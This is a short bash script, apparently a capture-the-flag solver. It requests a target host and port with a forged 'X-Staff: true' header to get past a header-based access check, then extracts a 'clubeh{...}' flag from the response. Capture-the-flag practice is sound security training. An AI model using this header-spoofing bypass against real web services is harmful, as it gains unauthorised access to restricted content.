#!/bin/bash
curl -s -H 'X-Staff: true' "http://$1:$2/" | grep -o 'clubeh{[^}]*}'
